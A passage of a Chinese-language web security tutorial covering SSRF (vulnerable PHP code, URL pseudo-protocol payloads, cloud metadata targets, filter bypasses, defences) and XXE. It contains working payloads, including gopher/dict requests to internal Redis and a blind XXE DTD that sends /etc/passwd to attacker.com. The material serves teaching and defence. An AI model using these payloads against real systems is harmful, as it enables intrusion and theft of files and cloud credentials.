class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>$_POST['url']</code> 完全由用户控制，没有任何过滤</p>
+<p>程序请求用户指定的 URL，并把内容保存为图片展示</p>
+<h5 id="fsockopen"><a class="markdownIt-Anchor" href="#fsockopen"></a> fsockopen()</h5>
+<p><code>fsockopen()</code> 用于<strong>打开一个网络 Socket 连接</strong>，可以建立 TCP/UDP 连接并与服务端进行原始数据交互。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$link</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$contents</span> .= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>$host</code>、<code>$port</code>、<code>$link</code> 由用户控制</p>
+<p>没有任何过滤限制</p>
+<p>可以连接任意主机的任意端口</p>
+<h5 id="curl_exec"><a class="markdownIt-Anchor" href="#curl_exec"></a> curl_exec()</h5>
+<p><code>curl_exec()</code> 是 PHP 中 <strong>cURL 库</strong>的执行函数，功能最强大、配置最灵活。支持多种协议、SSL、代理、Cookie 等。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_URL, <span class="variable">$link</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span> . <span class="title function_ invoke__">rand</span>() . <span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>CURLOPT_URL</code> 完全由用户控制</p>
+<p>没有任何白名单或过滤</p>
+<p>cURL 功能强大，支持多种协议</p>
+<h4 id="ussrf-中-url-的伪协议u"><a class="markdownIt-Anchor" href="#ussrf-中-url-的伪协议u"></a> <strong><u>SSRF 中 URL 的伪协议</u></strong></h4>
+<p>发现 SSRF 漏洞后，首先要测试所有可用的 URL 伪协议：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">协议</th>
+<th style="text-align:left">用途</th>
+<th style="text-align:left">示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>file://</code></td>
+<td style="text-align:left">从文件系统获取文件内容</td>
+<td style="text-align:left"><code>file:///etc/passwd</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>http://</code> / <code>https://</code></td>
+<td style="text-align:left">发起 HTTP/HTTPS 请求</td>
+<td style="text-align:left"><code>http://127.0.0.1/</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>dict://</code></td>
+<td style="text-align:left">字典服务器协议，访问字典资源</td>
+<td style="text-align:left"><code>dict://127.0.0.1:6379/info</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>ftp://</code></td>
+<td style="text-align:left">文件传输协议</td>
+<td style="text-align:left"><code>ftp://192.168.1.1:21</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>sftp://</code></td>
+<td style="text-align:left">SSH 文件传输协议</td>
+<td style="text-align:left"><code>sftp://evil.com:1337/</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>ldap://</code></td>
+<td style="text-align:left">轻量级目录访问协议</td>
+<td style="text-align:left"><code>ldap://localhost:1337/</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>tftp://</code></td>
+<td style="text-align:left">简单文件传输协议</td>
+<td style="text-align:left"><code>tftp://evil.com:1337/TEST</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>gopher://</code></td>
+<td style="text-align:left">分布式文档传递服务</td>
+<td style="text-align:left"><code>gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo</code></td>
+</tr>
+</tbody>
+</table>
+<h5 id="51-file-协议"><a class="markdownIt-Anchor" href="#51-file-协议"></a> 5.1 file:// 协议</h5>
+<p>尝试从文件系统中获取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=file:///etc/passwd</span><br><span class="line">http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure>
+<h5 id="52-dict-协议"><a class="markdownIt-Anchor" href="#52-dict-协议"></a> 5.2 dict:// 协议</h5>
+<p>引用允许通过 DICT 协议使用的定义或单词列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br></pre></td></tr></table></figure>
+<p>攻击者服务器收到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection from [192.168.0.12] port 1337</span><br><span class="line">CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
+<h5 id="53-sftp-协议"><a class="markdownIt-Anchor" href="#53-sftp-协议"></a> 5.3 sftp:// 协议</h5>
+<p>SSH 文件传输协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br></pre></td></tr></table></figure>
+<p>攻击者服务器收到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection from [192.168.0.12] port 1337</span><br><span class="line">SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure>
+<h5 id="54-ldap-ldaps-ldapi"><a class="markdownIt-Anchor" href="#54-ldap-ldaps-ldapi"></a> 5.4 ldap:// / ldaps:// / ldapi://</h5>
+<p>轻量级目录访问协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure>
+<h5 id="55-tftp"><a class="markdownIt-Anchor" href="#55-tftp"></a> 5.5 tftp://</h5>
+<p>简单文件传输协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br></pre></td></tr></table></figure>
+<p>攻击者服务器收到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Listening on [0.0.0.0] (port 1337)</span><br><span class="line">TESTUDPPACKECToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure>
+<h5 id="56-gopher-协议重点"><a class="markdownIt-Anchor" href="#56-gopher-协议重点"></a> 5.6 gopher:// 协议（重点）</h5>
+<p>Gopher 是一种分布式文档传递服务，<strong>利用价值最高</strong>，可以构造任意 TCP 数据包。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</span><br></pre></td></tr></table></figure>
+<p>gopher.php 内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>攻击者服务器收到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Connection from [192.168.0.12] port 1337</span><br><span class="line">Hi</span><br><span class="line">ssrf</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+<h3 id="22-攻击目标清单"><a class="markdownIt-Anchor" href="#22-攻击目标清单"></a> 2.2 攻击目标清单</h3>
+<p>看到 URL 参数<strong>不要只尝试外部网站</strong>，应系统性测试以下目标：</p>
+<p><strong>1. 本机地址</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/</span><br><span class="line">http://localhost/</span><br><span class="line">http://0.0.0.0/</span><br><span class="line">http://[::1]/</span><br></pre></td></tr></table></figure>
+<p><strong>2. 内网地址</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/</span><br><span class="line">http://10.0.0.1/</span><br><span class="line">http://172.16.0.1/</span><br></pre></td></tr></table></figure>
+<p><strong>3. 不同端口（探测内网服务）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:22      # SSH</span><br><span class="line">http://127.0.0.1:3306    # MySQL</span><br><span class="line">http://127.0.0.1:6379    # Redis</span><br><span class="line">http://127.0.0.1:9200    # Elasticsearch</span><br><span class="line">http://127.0.0.1:8080    # 代理/管理后台</span><br></pre></td></tr></table></figure>
+<p><strong>4. 云环境元数据服务（重点！）</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">云平台</th>
+<th style="text-align:left">元数据地址</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">AWS</td>
+<td style="text-align:left"><a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/">http://169.254.169.254/latest/meta-data/</a></td>
+</tr>
+<tr>
+<td style="text-align:left">GCP</td>
+<td style="text-align:left"><a target="_blank" rel="noopener" href="http://metadata.google.internal/computeMetadata/v1/">http://metadata.google.internal/computeMetadata/v1/</a></td>
+</tr>
+<tr>
+<td style="text-align:left">Azure</td>
+<td style="text-align:left"><a target="_blank" rel="noopener" href="http://169.254.169.254/metadata/instance?api-version=2017-08-01">http://169.254.169.254/metadata/instance?api-version=2017-08-01</a></td>
+</tr>
+<tr>
+<td style="text-align:left">阿里云</td>
+<td style="text-align:left"><a target="_blank" rel="noopener" href="http://100.100.100.200/latest/meta-data/">http://100.100.100.200/latest/meta-data/</a></td>
+</tr>
+</tbody>
+</table>
+<p><strong>5. 不同协议</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">dict://127.0.0.1:6379/info</span><br><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a</span><br><span class="line">ftp://192.168.1.1/</span><br></pre></td></tr></table></figure>
+<h3 id="23-有回显-vs-无回显"><a class="markdownIt-Anchor" href="#23-有回显-vs-无回显"></a> 2.3 有回显 vs 无回显</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类型</th>
+<th style="text-align:left">特征</th>
+<th style="text-align:left">利用方式</th>
+<th style="text-align:left">难度</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">有回显</td>
+<td style="text-align:left">服务器请求的内容直接返回到页面响应中</td>
+<td style="text-align:left">直接读取文件内容、服务信息</td>
+<td style="text-align:left">较低</td>
+</tr>
+<tr>
+<td style="text-align:left">无回显（Blind SSRF）</td>
+<td style="text-align:left">页面不返回请求内容，但服务器确实发起了请求</td>
+<td style="text-align:left">通过响应时间、HTTP 状态码、DNS 日志判断</td>
+<td style="text-align:left">较高</td>
+</tr>
+</tbody>
+</table>
+<p><strong>无回显场景下的探测技巧：</strong></p>
+<ol>
+<li>访问自己控制的服务器，查看访问日志</li>
+<li>利用 <code>dict://</code> 或 <code>gopher://</code> 协议与内网服务交互，观察响应差异</li>
+<li>通过响应时间判断端口是否开放（开放通常更快响应）</li>
+</ol>
+<h3 id="24-过滤与绕过"><a class="markdownIt-Anchor" href="#24-过滤与绕过"></a> 2.4 过滤与绕过</h3>
+<h4 id="241-常见的过滤代码有缺陷"><a class="markdownIt-Anchor" href="#241-常见的过滤代码有缺陷"></a> 2.4.1 常见的过滤代码（有缺陷）</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;禁止访问&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>问题</strong>：这种基于字符串匹配的过滤通常不可靠。</p>
+<h4 id="242-绕过思路"><a class="markdownIt-Anchor" href="#242-绕过思路"></a> 2.4.2 绕过思路</h4>
+<p><strong>第一类：IP 地址的不同表示方式</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">表示方式</th>
+<th style="text-align:left">示例</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">标准点分十进制</td>
+<td style="text-align:left">127.0.0.1</td>
+<td style="text-align:left">最常见</td>
+</tr>
+<tr>
+<td style="text-align:left">省略写法</td>
+<td style="text-align:left">127.1</td>
+<td style="text-align:left">省略部分为 0</td>
+</tr>
+<tr>
+<td style="text-align:left">十进制整数</td>
+<td style="text-align:left">2130706433</td>
+<td style="text-align:left">IP 转整数</td>
+</tr>
+<tr>
+<td style="text-align:left">十六进制</td>
+<td style="text-align:left">0x7F000001</td>
+<td style="text-align:left">十六进制表示</td>
+</tr>
+<tr>
+<td style="text-align:left">八进制</td>
+<td style="text-align:left">017700000001</td>
+<td style="text-align:left">八进制表示</td>
+</tr>
+<tr>
+<td style="text-align:left">域名解析</td>
+<td style="text-align:left">127.0.<a target="_blank" rel="noopener" href="https://0.1.nip.io/">0.1.nip.io</a></td>
+<td style="text-align:left">公共 DNS 解析服务</td>
+</tr>
+</tbody>
+</table>
+<p><strong>第二类：使用域名解析到内网地址</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">localhost</span><br><span class="line">127.0.0.1.xip.io</span><br><span class="line"># 自建 DNS 解析到任意内网 IP</span><br></pre></td></tr></table></figure>
+<p><strong>第三类：URL 解析差异</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://[::1]/              # IPv6 本地地址</span><br><span class="line">http://127.0.0.1@evil.com/ # 用户名部分</span><br><span class="line">http://evil.com#127.0.0.1  # 片段标识符</span><br><span class="line">http://evil.com/../127.0.0.1</span><br><span class="line">http://127.0.0.1.evil.com/ # 子域名</span><br></pre></td></tr></table></figure>
+<p><strong>第四类：重定向绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 访问 http://evil.com/redirect</span><br><span class="line">2. 服务器返回 302 重定向到 http://127.0.0.1/admin</span><br><span class="line">3. 如果服务端没有对重定向后的地址再次检查，则绕过成功</span><br></pre></td></tr></table></figure>
+<h4 id="243-分析过滤时的关键问题"><a class="markdownIt-Anchor" href="#243-分析过滤时的关键问题"></a> 2.4.3 分析过滤时的关键问题</h4>
+<ol>
+<li>过滤的是字符串，还是实际解析后的主机地址？</li>
+<li>是否只检查请求前的 URL？重定向后的地址会再次检查吗？</li>
+<li>URL 中的用户名、端口和片段是如何解析的？</li>
+<li>域名是否可能解析到内网地址？</li>
+<li>是否允许其他协议（file://、dict://、gopher://）？</li>
+</ol>
+<p><strong>核心原则</strong>：先弄清楚程序究竟检查了什么，HTTP 客户端最终又访问了什么。</p>
+<h3 id="25-ssrf-防御方案"><a class="markdownIt-Anchor" href="#25-ssrf-防御方案"></a> 2.5 SSRF 防御方案</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">优先级</th>
+<th style="text-align:left">防御措施</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">第一</td>
+<td style="text-align:left">不让用户直接控制完整 URL</td>
+<td style="text-align:left">使用白名单让用户选择预定义 URL</td>
+</tr>
+<tr>
+<td style="text-align:left">第二</td>
+<td style="text-align:left">协议白名单</td>
+<td style="text-align:left">仅允许 http/https</td>
+</tr>
+<tr>
+<td style="text-align:left">第三</td>
+<td style="text-align:left">域名白名单</td>
+<td style="text-align:left">仅允许访问指定的域名</td>
+</tr>
+<tr>
+<td style="text-align:left">第四</td>
+<td style="text-align:left">端口白名单</td>
+<td style="text-align:left">仅允许 80、443 等常用端口</td>
+</tr>
+<tr>
+<td style="text-align:left">第五</td>
+<td style="text-align:left">对解析后的真实 IP 校验</td>
+<td style="text-align:left">检查是否为内网地址，防范 DNS 重绑定</td>
+</tr>
+<tr>
+<td style="text-align:left">第六</td>
+<td style="text-align:left">禁止访问本机/内网/云元数据</td>
+<td style="text-align:left">设置网络黑名单</td>
+</tr>
+<tr>
+<td style="text-align:left">第七</td>
+<td style="text-align:left">限制服务器网络出口</td>
+<td style="text-align:left">防火墙控制出站流量</td>
+</tr>
+<tr>
+<td style="text-align:left">第八</td>
+<td style="text-align:left">禁止或严格校验重定向</td>
+<td style="text-align:left">设置不跟随重定向，或检查每个跳转目标</td>
+</tr>
+</tbody>
+</table>
+<h2 id="三-xxe-xml外部实体注入"><a class="markdownIt-Anchor" href="#三-xxe-xml外部实体注入"></a> 三、XXE XML外部实体注入</h2>
+<h3 id="31-什么是-xml-实体"><a class="markdownIt-Anchor" href="#31-什么是-xml-实体"></a> 3.1 什么是 XML 实体</h3>
+<p>实体可以理解为 XML 中的&quot;宏&quot;或&quot;变量&quot;。</p>
+<p><strong>内部实体示例：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;Alice&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面的 <code>&amp;name;</code> 会被解析器替换成 <code>Alice</code>。</p>
+<p><strong>外部实体示例：</strong></p>
+<p>如果实体定义中引用了外部资源，就称为外部实体：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当解析器允许外部实体时，就会去读取本地文件。</p>
+<h3 id="32-xxe-出现的位置"><a class="markdownIt-Anchor" href="#32-xxe-出现的位置"></a> 3.2 XXE 出现的位置</h3>
+<p>看到以下场景时，<strong>需要想到 XXE</strong>：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">编号</th>
+<th style="text-align:left">场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">接口接收 XML 数据（Content-Type: application/xml）</td>
+</tr>
+<tr>
+<td style="text-align:left">2</td>
+<td style="text-align:left">SOAP 服务（Web Service）</td>
+</tr>
+<tr>
+<td style="text-align:left">3</td>
+<td style="text-align:left">上传 SVG 文件（SVG 本质是 XML）</td>
+</tr>
+<tr>
+<td style="text-align:left">4</td>
+<td style="text-align:left">导入 XML 配置文件</td>
+</tr>
+<tr>
+<td style="text-align:left">5</td>
+<td style="text-align:left">Office 文档（docx、xlsx 等本质是 ZIP 包含 XML）</td>
+</tr>
+<tr>
+<td style="text-align:left">6</td>
+<td style="text-align:left">程序使用 XML 解析库处理用户数据</td>
+</tr>
+<tr>
+<td style="text-align:left">7</td>
+<td style="text-align:left">RSS/Atom 订阅源解析</td>
+</tr>
+<tr>
+<td style="text-align:left">8</td>
+<td style="text-align:left">任何看似&quot;上传数据&quot;且格式可以是 XML 的功能</td>
+</tr>
+</tbody>
+</table>
+<h3 id="33-xxe-的利用方式"><a class="markdownIt-Anchor" href="#33-xxe-的利用方式"></a> 3.3 XXE 的利用方式</h3>
+<h4 id="331-读取本地文件最经典"><a class="markdownIt-Anchor" href="#331-读取本地文件最经典"></a> 3.3.1 读取本地文件（最经典）</h4>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果返回的 XML 中包含 <code>&amp;xxe;</code> 的解析结果，就能读取文件内容。</p>
+<p><strong>Windows 路径示例：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/windows/win.ini&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="332-访问内网资源xxe-ssrf"><a class="markdownIt-Anchor" href="#332-访问内网资源xxe-ssrf"></a> 3.3.2 访问内网资源（XXE → SSRF）</h4>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://169.254.169.254/latest/meta-data/&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="333-带外数据泄露blind-xxe"><a class="markdownIt-Anchor" href="#333-带外数据泄露blind-xxe"></a> 3.3.3 带外数据泄露（Blind XXE）</h4>
+<p>当没有回显时，可以让服务器访问攻击者的服务器。</p>
+<p><strong>第一步：内部 DTD 触发外部 DTD 加载</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %dtd;</span></span><br><span class="line"><span class="meta">  %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>test<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>第二步：外部 DTD 文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % send SYSTEM &quot;http://attacker.com/?data=%file;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>解析过程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 加载外部 DTD evil.dtd</span><br><span class="line">2. 执行 %send;，将文件内容通过 HTTP 请求发送到攻击者服务器</span><br></pre></td></tr></table></figure>
+<h4 id="334-拒绝服务billion-laughs-攻击"><a class="markdownIt-Anchor" href="#334-拒绝服务billion-laughs-攻击"></a> 3.3.4 拒绝服务（Billion Laughs 攻击）</h4>
